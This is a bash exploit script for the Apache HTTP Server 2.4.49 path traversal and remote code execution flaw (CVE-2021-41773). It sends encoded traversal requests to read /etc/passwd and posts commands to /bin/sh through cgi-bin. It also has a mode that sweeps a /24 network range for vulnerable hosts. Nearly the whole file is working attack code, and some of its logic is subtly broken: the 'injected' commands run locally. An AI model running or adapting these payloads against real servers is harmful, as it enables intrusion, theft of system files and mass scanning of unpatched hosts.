#!/bin/bash

# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Exploit Author: K3ysTr0K3R
# Vendor Homepage: https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE: CVE-2021-41773

Y='\e[33m'
G='\e[32m'
B='\e[34m'
R='\e[31m'

# Ignore this, part im looking for existing files this script creates so that it can be removed before recreation.

if [ $(ls | grep serv.txt ) ]; then
	rm serv.txt &>/dev/null
fi

# Creating arguments to use this script.

while getopts ":us" menu; do
	case $menu in
		u)
			# Identify vulnerable server version from Apache 2.4.49 and Apache 2.4.50
			target=$2
			vuln_server=$(HEAD -E $target | grep Server | awk '{print $2}')
			if [[ "$vuln_server" == *"Apache/2.4.49"* ]]; then
				echo -e "${Y}[${B}+${Y}] ${G}$vuln_server"
				echo -e "${Y}[${B}+${Y}] The Server appears to be outdated, maybe vulnerable${B}: ${G}$vuln_server"
				passwd=$(curl -s -k --path-as-is "$target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep HTTP | awk '{print $2}')
				if [ "$passwd" == "200" ]; then
					echo -e "${Y}[${B}+${Y}] Found${B}: ${G}$target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
					echo "$passwd"
				else
					echo -e "${Y}[${R}~${Y}] Cant Find Directory Traversal${B}: ${R}$target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
				fi

				shell=$(curl -k -I --silent --connect-timeout 3 "$target/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh" | grep HTTP | awk '{print $2}')
				if [ "$shell" == "200" ]; then
					echo -e "${Y}[${B}+${Y}] Found RCE Entry${B}: ${G}$target/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
					# Inject commands into the server.
					system=$(uname) # Check target system.
					username=$(whoami) # Check target username.
					directory=$(pwd) # Check the area directory from the target.
					identify=$(id) # Identify target
					curl -k $target/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data "echo Content-Type: text/plain; echo; $system; $username; $directory; $identify"
				else
					echo -e "${Y}[${R}~${Y}] Cant Find RCE Entry${B}: ${R}$target/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
				fi
			;;

			s)
				trap 'rm serv.txt &>/dev/null; exit' INT
				target=$2
				for range in $(echo "$target/24" | httpx -silent); do
					vuln_server=$(HEAD -E $range | grep Server | awk '{print $2}')
					if [[ "$vuln_server" == *"Apache/2.4.49"* ]]; then
						cgi_bin=$(curl -k -I --silent --connect-timeout 3 "$target/cgi-bin" | grep HTTP | awk '{print $2}')
						if [ "$cgi_bin" == "200" ]; then
							echo -e "${Y}[${B}+${Y}] ${Y}[${G}VULNERABLE${Y}] - ${G}$vuln_server" | tee -a serv.txt
						fi
                                        fi
				done
				rm serv.txt &>/dev/null
				;;
		esac
done
